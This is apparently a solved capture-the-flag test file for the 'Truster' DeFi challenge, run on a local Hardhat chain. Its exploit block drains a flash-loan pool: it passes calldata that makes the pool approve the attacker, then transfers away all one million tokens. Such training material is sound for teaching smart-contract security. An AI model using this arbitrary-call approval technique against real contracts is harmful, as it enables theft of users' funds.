const { ethers } = require('hardhat');
const { expect } = require('chai');
const { getContractFactory } = require('@nomiclabs/hardhat-ethers/types');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */                        
        const iface = new ethers.utils.Interface([
            "function approve(address,uint256) external returns (bool)"
        ])
        const calldata = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);                        
        await this.pool.flashLoan(
            ethers.BigNumber.from("0"),
            attacker.address,            
            this.token.address,            
            calldata    
        );

        const allowance = await this.token.allowance(this.pool.address, attacker.address);                
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, allowance);                
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

